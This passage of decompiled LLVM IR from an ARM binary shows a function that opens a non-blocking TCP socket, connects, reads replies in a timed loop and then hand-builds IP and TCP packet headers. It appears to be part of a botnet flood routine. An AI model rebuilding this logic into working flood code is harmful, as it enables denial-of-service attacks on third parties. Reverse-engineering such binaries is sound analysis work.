dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad60.preheader, %dec_label_pc_aed4
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_aed4 ], [ %tmp34, %dec_label_pc_ad60.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_aed4 ], [ %tmp37, %dec_label_pc_ad60.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ad6c = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_ad6c, i32* %r0.global-to-local, align 4
  %v7_ad70 = icmp eq i32 %v3_ad6c, -1
  store i1 %v7_ad70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad6c, i32* @r5, align 4
  br i1 %v7_ad70, label %dec_label_pc_aed4, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad60, %dec_label_pc_aeb0
  %v0_ad84 = phi i32 [ %v3_aec4, %dec_label_pc_aeb0 ], [ %v3_ad6c, %dec_label_pc_ad60 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aeb0 ], [ %stack_var_-62.0, %dec_label_pc_ad60 ]
  %stack_var_-60.1 = phi i32 [ %v0_af84, %dec_label_pc_aeb0 ], [ %stack_var_-60.0, %dec_label_pc_ad60 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ad84 = call i32 @function_11140(i32 %v0_ad84, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ad8c = or i32 %v2_ad84, 2048
  store i32 %v1_ad8c, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r5, align 4
  store i32 %v0_ad90, i32* %r0.global-to-local, align 4
  %v2_ad94 = call i32 @function_11140(i32 %v0_ad90, i32 4)
  %v3_ad98 = load i32, i32* %stack_var_-44, align 4
  %v5_ada0 = mul i32 %v3_ad98, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adac, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adb4 = add i32 %v5_ada0, %arg2
  store i32 %v2_adb4, i32* %r3.global-to-local, align 4
  %v1_adb8 = add i32 %v2_adb4, 20
  %v2_adb8 = inttoptr i32 %v1_adb8 to i8*
  %v3_adb8 = load i8, i8* %v2_adb8, align 1
  %v4_adb8 = zext i8 %v3_adb8 to i32
  store i32 %v4_adb8, i32* %r2.global-to-local, align 4
  %v2_adbc = icmp ugt i8 %v3_adb8, 30
  %v7_adbc = icmp eq i8 %v3_adb8, 31
  store i1 %v7_adbc, i1* %cpsr_z.global-to-local, align 1
  %v2_adc0 = xor i1 %v7_adbc, true
  %v3_adc0 = and i1 %v2_adbc, %v2_adc0
  br i1 %v3_adc0, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_ad7c
  %v5_adc0 = add i32 %v2_adb4, 16
  %v6_adc0 = inttoptr i32 %v5_adc0 to i32*
  %v7_adc0 = load i32, i32* %v6_adc0, align 4
  store i32 %v7_adc0, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_ad7c, %bb
  %v4_adc4 = phi i32 [ %v2_adb4, %dec_label_pc_ad7c ], [ %v7_adc0, %bb ]
  %v4_adc4.stack_var_-60.1 = select i1 %v3_adc0, i32 %v4_adc4, i32 %stack_var_-60.1
  %v2_adc8 = xor i1 %v2_adbc, true
  %v3_adc8 = or i1 %v7_adbc, %v2_adc8
  br i1 %v3_adc8, label %dec_label_pc_af10, label %dec_label_pc_adcc

dec_label_pc_adcc:                                ; preds = %bb71, %dec_label_pc_af10
  %v0_af84 = phi i32 [ %v5_af60, %dec_label_pc_af10 ], [ %v4_adc4.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_add4 = load i32, i32* @sl, align 4
  %v9_add4 = icmp eq i32 %v0_add4, 65535
  store i1 %v9_add4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_add4, label %dec_label_pc_af6c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_adcc
  %v4_add8 = udiv i32 %v0_add4, 256
  %v2_addc = urem i32 %v0_add4, 256
  store i32 %v2_addc, i32* %r2.global-to-local, align 4
  %v5_ade0 = mul nuw nsw i32 %v2_addc, 256
  %v6_ade0 = or i32 %v5_ade0, %v4_add8
  store i32 %v6_ade0, i32* %r3.global-to-local, align 4
  store i32 %v2_adac, i32* %r0.global-to-local, align 4
  %v2_ade8 = trunc i32 %v6_ade0 to i16
  store i16 %v2_ade8, i16* %v5_ade8, align 2
  br label %dec_label_pc_adf0

dec_label_pc_adf0:                                ; preds = %.thread9, %dec_label_pc_af6c
  %stack_var_-62.2 = phi i16 [ %v1_af6c, %dec_label_pc_af6c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_adf0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r0.global-to-local, align 4
  %v3_adfc = call i32 @function_118d4(i32 %v0_adf8, i32 %v2_adf0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae04 = call i32 @function_10f8c(i32* null)
  store i32 %v2_ae04, i32* %r0.global-to-local, align 4
  store i32 %v2_ae04, i32* @r4, align 4
  %v9_ae64 = icmp eq i32 %tmp35, %v0_af84
  %v4_ae8c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_ae64 to i32
  %v9_ae78 = icmp eq i1 %v9_ae64, false
  %v9_ae90 = icmp eq i32 %v3_ae84, %v4_ae8c
  br label %dec_label_pc_ae20

dec_label_pc_ae10:                                ; preds = %.thread, %dec_label_pc_ae80, %dec_label_pc_aea8, %bb75
  %v2_ae10 = call i32 @function_10f8c(i32* null)
  %v0_ae14 = load i32, i32* @r4, align 4
  %v2_ae14 = sub i32 %v2_ae10, %v0_ae14
  store i32 %v2_ae14, i32* %r0.global-to-local, align 4
  %v7_ae18 = icmp eq i32 %v2_ae14, 10
  store i1 %v7_ae18, i1* %cpsr_z.global-to-local, align 1
  %v8_ae1c = icmp sgt i32 %v2_ae14, 10
  br i1 %v8_ae1c, label %dec_label_pc_aeb0, label %dec_label_pc_ae20

dec_label_pc_ae20:                                ; preds = %dec_label_pc_ae10, %dec_label_pc_adf0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae34, i32* %r1.global-to-local, align 4
  store i32 %v2_ae38, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae40 = load i32, i32* @sb, align 4
  store i32 %v0_ae40, i32* %r0.global-to-local, align 4
  %v6_ae48 = call i32 @function_119f4(i32 %v0_ae40, i32 %v2_ae34, i32 256, i32 16384, i32 %v2_ae28, i32 %v2_ae38)
  store i32 %v6_ae48, i32* %r2.global-to-local, align 4
  %v7_ae50 = icmp eq i32 %v6_ae48, -1
  store i1 %v7_ae50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae50, label %dec_label_pc_af04, label %dec_label_pc_ae5c

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae20
  store i32 %v0_af84, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_ae70 = icmp eq i32 %v6_ae48, 40
  store i1 %v7_ae70, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae48, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae5c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae10

bb75:                                             ; preds = %dec_label_pc_ae5c
  store i1 %v9_ae78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae78, label %dec_label_pc_ae10, label %dec_label_pc_ae80

dec_label_pc_ae80:                                ; preds = %bb75
  store i32 %v3_ae84, i32* @lr, align 4
  store i32 %v2_adac, i32* @r3, align 4
  store i32 %v4_ae8c, i32* %r2.global-to-local, align 4
  store i1 %v9_ae90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae90, label %dec_label_pc_ae98, label %dec_label_pc_ae10

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae80
  store i32 %v4_ae98, i32* %r2.global-to-local, align 4
  store i32 %v1_ae9c, i32* @r3, align 4
  store i1 %v2_aea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aea0, label %dec_label_pc_af7c, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae98
  store i1 %v2_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aea8, label %dec_label_pc_ae10, label %dec_label_pc_aeb0

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_aea8, %dec_label_pc_ae10
  %v0_aeb0 = load i32, i32* @r5, align 4
  store i32 %v0_aeb0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = call i32 @function_1130c(i32 %v0_aeb0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aec4 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_aec4, i32* %r0.global-to-local, align 4
  %v3_aec8 = icmp eq i32 %v3_aec4, -1
  %v8_aec8 = icmp eq i32 %v3_aec4, -1
  store i1 %v8_aec8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aec4, i32* @r5, align 4
  br i1 %v3_aec8, label %dec_label_pc_aed4, label %dec_label_pc_ad7c

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad60, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ad60 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aeb0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ad60 ], [ %v0_af84, %bb82 ], [ %v0_af84, %dec_label_pc_aeb0 ]
  %v3_aed4 = load i32, i32* %stack_var_-44, align 4
  %v1_aed8 = add i32 %v3_aed4, 1
  store i32 %v1_aed8, i32* @r3, align 4
  %v1_aedc = load i32, i32* @r6, align 4
  %v9_aedc = icmp eq i32 %v1_aed8, %v1_aedc
  store i1 %v9_aedc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aed8, i32* %stack_var_-44, align 4
  %v5_aee4 = icmp slt i32 %v1_aed8, %v1_aedc
  br i1 %v5_aee4, label %dec_label_pc_ad60, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed4
  store i32 %v6_acdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b198

dec_label_pc_aefc:                                ; preds = %dec_label_pc_ad20
  %v0_aefc = load i32, i32* @sb, align 4
  store i32 %v0_aefc, i32* %r0.global-to-local, align 4
  %v1_af00 = call i32 @function_1130c(i32 %v0_aefc)
  store i32 %v1_af00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_ae20, %dec_label_pc_ab3c, %dec_label_pc_aefc
  %v1_af0c = phi i32 [ %v3_ad10, %dec_label_pc_ab3c ], [ %v1_af00, %dec_label_pc_aefc ], [ 0, %dec_label_pc_ae20 ]
  store i32 %v27_ab3c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af0c

dec_label_pc_af10:                                ; preds = %bb71
  %v1_af10 = add i32 %v4_adc4, 16
  %v2_af10 = inttoptr i32 %v1_af10 to i32*
  %v3_af10 = load i32, i32* %v2_af10, align 4
  store i32 %v3_af10, i32* @r4, align 4
  %v0_af14 = call i32 @function_e0d0()
  store i32 %v0_af14, i32* %r0.global-to-local, align 4
  %v3_af18 = load i32, i32* %stack_var_-44, align 4
  %v5_af20 = mul i32 %v3_af18, 24
  %v0_af28 = load i32, i32* @r4, align 4
  %v1_af28 = and i32 %v0_af28, 16711680
  store i32 %v1_af28, i32* %ip.global-to-local, align 4
  %v3_af2c = udiv i32 %v0_af28, 16777216
  %v2_af30 = add i32 %v5_af20, %arg2
  store i32 %v2_af30, i32* %r1.global-to-local, align 4
  %v4_af34 = udiv i32 %v1_af28, 256
  %v5_af34 = or i32 %v4_af34, %v3_af2c
  store i32 %v5_af34, i32* %r2.global-to-local, align 4
  %v1_af38 = and i32 %v0_af28, 65280
  store i32 %v1_af38, i32* %r3.global-to-local, align 4
  %v1_af3c = add i32 %v2_af30, 20
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v4_af3c = zext i8 %v3_af3c to i32
  store i32 %v4_af3c, i32* %ip.global-to-local, align 4
  %v5_af44 = call i32 @llvm.bswap.i32(i32 %v0_af28)
  %v7_af48 = lshr i32 %v0_af14, %v4_af3c
  %v8_af48 = add i32 %v7_af48, %v5_af44
  store i32 %v8_af48, i32* %r2.global-to-local, align 4
  %v1_af4c = and i32 %v8_af48, 16711680
  store i32 %v1_af4c, i32* %r0.global-to-local, align 4
  %v1_af58 = and i32 %v8_af48, 65280
  store i32 %v1_af58, i32* %r1.global-to-local, align 4
  %v5_af60 = call i32 @llvm.bswap.i32(i32 %v8_af48)
  store i32 %v5_af60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_adcc

dec_label_pc_af6c:                                ; preds = %dec_label_pc_adcc
  %v0_af6c = call i32 @function_e0d0()
  %v1_af6c = trunc i32 %v0_af6c to i16
  store i32 %v0_af6c, i32* %r0.global-to-local, align 4
  store i32 %v2_adac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_af7c:                                ; preds = %dec_label_pc_ae98
  %v3_af7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_af7c, i32* @r4, align 4
  store i32 %v2_ab58, i32* %ip.global-to-local, align 4
  %v5_af84 = mul i32 %v3_af7c, 16
  %v6_af84 = add i32 %v5_af84, %v2_ab58
  %v7_af84 = inttoptr i32 %v6_af84 to i32*
  store i32 %v0_af84, i32* %v7_af84, align 4
  %v0_af88 = load i32, i32* @r8, align 4
  %v1_af88 = add i32 %v0_af88, 4
  %v2_af88 = inttoptr i32 %v1_af88 to i32*
  %v3_af88 = load i32, i32* %v2_af88, align 4
  store i32 %v3_af88, i32* %r1.global-to-local, align 4
  %v1_af94 = and i32 %v3_af88, 65280
  store i32 %v1_af94, i32* %r2.global-to-local, align 4
  store i32 %v2_ab58, i32* %r0.global-to-local, align 4
  %v0_afa4 = load i32, i32* @r4, align 4
  %v3_afa4 = mul i32 %v0_afa4, 16
  %v2_afa8 = add i32 %v3_afa4, %v2_ab58
  store i32 %v2_afa8, i32* %ip.global-to-local, align 4
  %v5_afac = call i32 @llvm.bswap.i32(i32 %v3_af88)
  store i32 %v5_afac, i32* %r3.global-to-local, align 4
  %v2_afb0 = add i32 %v2_afa8, 4
  %v3_afb0 = inttoptr i32 %v2_afb0 to i32*
  store i32 %v5_afac, i32* %v3_afb0, align 4
  %v0_afb4 = load i32, i32* @r8, align 4
  %v1_afb4 = add i32 %v0_afb4, 8
  %v2_afb4 = inttoptr i32 %v1_afb4 to i32*
  %v3_afb4 = load i32, i32* %v2_afb4, align 4
  store i32 %v3_afb4, i32* %r1.global-to-local, align 4
  %v1_afb8 = and i32 %v3_afb4, 16711680
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  store i32 %v6_acdc, i32* %r2.global-to-local, align 4
  %v5_afd0 = call i32 @llvm.bswap.i32(i32 %v3_afb4)
  store i32 %v5_afd0, i32* %r3.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afb4, 2
  %v2_afd4 = inttoptr i32 %v1_afd4 to i16*
  %v3_afd4 = load i16, i16* %v2_afd4, align 2
  %v4_afd4 = zext i16 %v3_afd4 to i32
  store i32 %v4_afd4, i32* %r1.global-to-local, align 4
  store i32 %v1_afd8, i32* @r7, align 4
  %v0_afdc = load i32, i32* @lr, align 4
  %v1_afdc = trunc i32 %v0_afdc to i16
  %v2_afdc = load i32, i32* %ip.global-to-local, align 4
  %v3_afdc = add i32 %v2_afdc, 14
  %v4_afdc = inttoptr i32 %v3_afdc to i16*
  store i16 %v1_afdc, i16* %v4_afdc, align 2
  %v0_afe0 = load i32, i32* %r1.global-to-local, align 4
  %v1_afe0 = trunc i32 %v0_afe0 to i16
  %v2_afe0 = load i32, i32* %ip.global-to-local, align 4
  %v3_afe0 = add i32 %v2_afe0, 12
  %v4_afe0 = inttoptr i32 %v3_afe0 to i16*
  store i16 %v1_afe0, i16* %v4_afe0, align 2
  %v0_afe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v2_afe4 = add i32 %v1_afe4, 8
  %v3_afe4 = inttoptr i32 %v2_afe4 to i32*
  store i32 %v0_afe4, i32* %v3_afe4, align 4
  %v0_afe8 = load i32, i32* @r7, align 4
  store i32 %v0_afe8, i32* @r0, align 4
  %v0_afec = call i32 @function_11d34()
  store i32 %v0_afec, i32* %r0.global-to-local, align 4
  store i32 %v2_ab68, i32* %r3.global-to-local, align 4
  %v2_aff8 = load i32, i32* @r4, align 4
  %v5_aff8 = mul i32 %v2_aff8, 4
  %v6_aff8 = add i32 %v5_aff8, %v2_ab68
  %v7_aff8 = inttoptr i32 %v6_aff8 to i32*
  store i32 %v0_afec, i32* %v7_aff8, align 4
  %v3_affc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_affc, i32* %r2.global-to-local, align 4
  %v0_b000 = load i32, i32* %r3.global-to-local, align 4
  %v4_b000 = mul i32 %v3_affc, 4
  %v5_b000 = add i32 %v0_b000, %v4_b000
  %v6_b000 = inttoptr i32 %v5_b000 to i32*
  %v7_b000 = load i32, i32* %v6_b000, align 4
  store i32 %v7_b000, i32* @r4, align 4
  %v1_b004 = inttoptr i32 %v7_b000 to i8*
  %v2_b004 = load i8, i8* %v1_b004, align 1
  %tmp103 = urem i8 %v2_b004, 16
  %v1_b008 = zext i8 %tmp103 to i32
  %v1_b00c = or i32 %v1_b008, 64
  store i32 %v1_b00c, i32* %r3.global-to-local, align 4
  %v1_b010 = trunc i32 %v1_b00c to i8
  store i8 %v1_b010, i8* %v1_b004, align 1
  %v0_b014 = load i32, i32* @r4, align 4
  %v1_b014 = inttoptr i32 %v0_b014 to i8*
  %v2_b014 = load i8, i8* %v1_b014, align 1
  %v0_b018 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b018, 256
  %v1_b020 = and i8 %v2_b014, -16
  %v1_b024 = or i8 %v1_b020, 5
  %v1_b028 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b018, 256
  %v4_b02c = urem i32 %tmp78, 256
  %v5_b02c = or i32 %v4_b02c, %v1_b028
  store i32 %v5_b02c, i32* %r2.global-to-local, align 4
  %v0_b030 = load i32, i32* @fp, align 4
  %v1_b030 = urem i32 %v0_b030, 256
  store i32 %v1_b030, i32* %r0.global-to-local, align 4
  store i32 %v1_abe8, i32* %ip.global-to-local, align 4
  %v3_b038 = udiv i32 %v0_b030, 256
  store i32 %v3_b038, i32* %r1.global-to-local, align 4
  store i8 %v1_b024, i8* %v1_b014, align 1
  %v0_b040 = load i32, i32* %r1.global-to-local, align 4
  %v1_b040 = load i32, i32* %r0.global-to-local, align 4
  %v4_b040 = mul i32 %v1_b040, 256
  %v5_b040 = or i32 %v4_b040, %v0_b040
  store i32 %v5_b040, i32* %r1.global-to-local, align 4
  store i32 %v4_b044, i32* %r0.global-to-local, align 4
  %v2_b048 = load i32, i32* @r4, align 4
  %v3_b048 = add i32 %v2_b048, 1
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 %v5_aba0, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %r1.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* @r4, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v2_b050 = icmp eq i32 %v0_b050, 0
  store i1 %v2_b050, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b054, i32* %r1.global-to-local, align 4
  %v0_b058 = load i32, i32* %r2.global-to-local, align 4
  %v1_b058 = trunc i32 %v0_b058 to i16
  %v2_b058 = load i32, i32* @r4, align 4
  %v3_b058 = add i32 %v2_b058, 2
  %v4_b058 = inttoptr i32 %v3_b058 to i16*
  store i16 %v1_b058, i16* %v4_b058, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b050, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_af7c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_af7c, %bb79
  %v0_b064 = load i32, i32* %r1.global-to-local, align 4
  %v1_b064 = trunc i32 %v0_b064 to i8
  %v2_b064 = load i32, i32* @r4, align 4
  %v3_b064 = add i32 %v2_b064, 8
  %v4_b064 = inttoptr i32 %v3_b064 to i8*
  store i8 %v1_b064, i8* %v4_b064, align 1
  %v0_b068 = load i32, i32* %r3.global-to-local, align 4
  %v1_b068 = trunc i32 %v0_b068 to i8
  %v2_b068 = load i32, i32* @r4, align 4
  %v3_b068 = add i32 %v2_b068, 9
  %v4_b068 = inttoptr i32 %v3_b068 to i8*
  store i8 %v1_b068, i8* %v4_b068, align 1
  %v0_b06c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b06c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b06c = load i32, i32* %r2.global-to-local, align 4
  %v2_b06c = trunc i32 %v1_b06c to i16
  %v3_b06c = load i32, i32* @r4, align 4
  %v4_b06c = add i32 %v3_b06c, 6
  %v5_b06c = inttoptr i32 %v4_b06c to i16*
  store i16 %v2_b06c, i16* %v5_b06c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r2.global-to-local, align 4
  %v2_b074 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_b074, i32* %r1.global-to-local, align 4
  %v1_b078 = load i32, i32* @r4, align 4
  %v2_b078 = add i32 %v1_b078, 12
  %v3_b078 = inttoptr i32 %v2_b078 to i32*
  store i32 %v2_b074, i32* %v3_b078, align 4
  %v3_b07c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b07c, i32* %r3.global-to-local, align 4
  store i32 %v2_ab58, i32* %ip.global-to-local, align 4
  %v4_b084 = mul i32 %v3_b07c, 16
  %v5_b084 = add i32 %v4_b084, %v2_ab58
  %v6_b084 = inttoptr i32 %v5_b084 to i32*
  %v7_b084 = load i32, i32* %v6_b084, align 4
  store i32 %v7_b084, i32* %r2.global-to-local, align 4
  store i32 %v5_b084, i32* %r3.global-to-local, align 4
  %v1_b090 = load i32, i32* @r4, align 4
  %v2_b090 = add i32 %v1_b090, 16
  %v3_b090 = inttoptr i32 %v2_b090 to i32*
  store i32 %v7_b084, i32* %v3_b090, align 4
  %v0_b094 = load i32, i32* %r3.global-to-local, align 4
  %v1_b094 = add i32 %v0_b094, 12
  %v2_b094 = inttoptr i32 %v1_b094 to i16*
  %v3_b094 = load i16, i16* %v2_b094, align 2
  %v4_b094 = zext i16 %v3_b094 to i32
  store i32 %v4_b094, i32* %r0.global-to-local, align 4
  %v1_b098 = add i32 %v0_b094, 8
  %v2_b098 = inttoptr i32 %v1_b098 to i32*
  %v3_b098 = load i32, i32* %v2_b098, align 4
  store i32 %v3_b098, i32* %r1.global-to-local, align 4
  %v2_b09c = load i32, i32* @r4, align 4
  %v3_b09c = add i32 %v2_b09c, 20
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v3_b094, i16* %v4_b09c, align 2
  %v0_b0a0 = load i32, i32* @r4, align 4
  %v1_b0a0 = add i32 %v0_b0a0, 20
  store i32 %v1_b0a0, i32* @r8, align 4
  %v1_b0a4 = add i32 %v0_b0a0, 33
  %v2_b0a4 = inttoptr i32 %v1_b0a4 to i8*
  %v3_b0a4 = load i8, i8* %v2_b0a4, align 1
  %v4_b0a4 = zext i8 %v3_b0a4 to i32
  store i32 %v4_b0a4, i32* %r2.global-to-local, align 4
  %v0_b0a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0a8 = add i32 %v0_b0a0, 24
  %v3_b0a8 = inttoptr i32 %v2_b0a8 to i32*
  store i32 %v0_b0a8, i32* %v3_b0a8, align 4
  %v0_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ac = or i32 %v0_b0ac, 1
  store i32 %v1_b0ac, i32* %r2.global-to-local, align 4
  %v0_b0b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0b0 = add i32 %v0_b0b0, 4
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i32*
  %v3_b0b0 = load i32, i32* %v2_b0b0, align 4
  store i32 %v3_b0b0, i32* %r1.global-to-local, align 4
  %v1_b0b4 = add i32 %v0_b0b0, 14
  %v2_b0b4 = inttoptr i32 %v1_b0b4 to i16*
  %v3_b0b4 = load i16, i16* %v2_b0b4, align 2
  %v4_b0b4 = zext i16 %v3_b0b4 to i32
  store i32 %v4_b0b4, i32* %r3.global-to-local, align 4
  %v1_b0b8 = trunc i32 %v1_b0ac to i8
  %v2_b0b8 = load i32, i32* @r8, align 4
  %v3_b0b8 = add i32 %v2_b0b8, 13
  %v4_b0b8 = inttoptr i32 %v3_b0b8 to i8*
  store i8 %v1_b0b8, i8* %v4_b0b8, align 1
  %v0_b0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0bc = trunc i32 %v0_b0bc to i16
  %v2_b0bc = load i32, i32* @r8, align 4
  %v3_b0bc = add i32 %v2_b0bc, 2
  %v4_b0bc = inttoptr i32 %v3_b0bc to i16*
  store i16 %v1_b0bc, i16* %v4_b0bc, align 2
  %v0_b0c0 = load i32, i32* @r8, align 4
  %v1_b0c0 = add i32 %v0_b0c0, 12
  %v2_b0c0 = inttoptr i32 %v1_b0c0 to i8*
  %v3_b0c0 = load i8, i8* %v2_b0c0, align 1
  %v4_b0c0 = zext i8 %v3_b0c0 to i32
  store i32 %v4_b0c0, i32* %r3.global-to-local, align 4
  %v1_b0c4 = add i32 %v0_b0c0, 13
  %v2_b0c4 = inttoptr i32 %v1_b0c4 to i8*
  %v3_b0c4 = load i8, i8* %v2_b0c4, align 1
  %v4_b0c4 = zext i8 %v3_b0c4 to i32
  %tmp104 = urem i8 %v3_b0c0, 16
  %v1_b0c8 = zext i8 %tmp104 to i32
  %v1_b0cc = or i32 %v1_b0c8, 128
  store i32 %v1_b0cc, i32* %r3.global-to-local, align 4
  %v1_b0d0 = or i32 %v4_b0c4, 16
  store i32 %v1_b0d0, i32* %r2.global-to-local, align 4
  %v0_b0d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0c0, 8
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  %v0_b0d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d8 = trunc i32 %v0_b0d8 to i8
  %v2_b0d8 = load i32, i32* @r8, align 4
  %v3_b0d8 = add i32 %v2_b0d8, 12
  %v4_b0d8 = inttoptr i32 %v3_b0d8 to i8*
  store i8 %v1_b0d8, i8* %v4_b0d8, align 1
  %v0_b0dc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0dc = trunc i32 %v0_b0dc to i8
  %v2_b0dc = load i32, i32* @r8, align 4
  %v3_b0dc = add i32 %v2_b0dc, 13
  %v4_b0dc = inttoptr i32 %v3_b0dc to i8*
  store i8 %v1_b0dc, i8* %v4_b0dc, align 1
  %v0_b0e0 = call i32 @function_e0d0()
  %v1_b0e0 = trunc i32 %v0_b0e0 to i16
  store i32 %v0_b0e0, i32* %r0.global-to-local, align 4
  store i32 %v1_ac24, i32* %r1.global-to-local, align 4
  %v0_b0e8 = load i32, i32* @r8, align 4
  %v1_b0e8 = add i32 %v0_b0e8, 13
  %v2_b0e8 = inttoptr i32 %v1_b0e8 to i8*
  %v3_b0e8 = load i8, i8* %v2_b0e8, align 1
  %v4_b0e8 = zext i8 %v3_b0e8 to i32
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v1_b0f0 = and i32 %v4_b0e8, 223
  %v5_b0f4 = or i32 %v1_b0f0, %v4_b0f4
  store i32 %v5_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v5_b0f4 to i8
  store i8 %v1_b0f8, i8* %v2_b0e8, align 1
  store i32 %v1_ac44, i32* %ip.global-to-local, align 4
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 13
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v1_b104, i32* %r3.global-to-local, align 4
  %v1_b108 = and i32 %v4_b100, 239
  %v5_b10c = or i32 %v1_b108, %v4_b10c
  store i32 %v5_b10c, i32* %r2.global-to-local, align 4
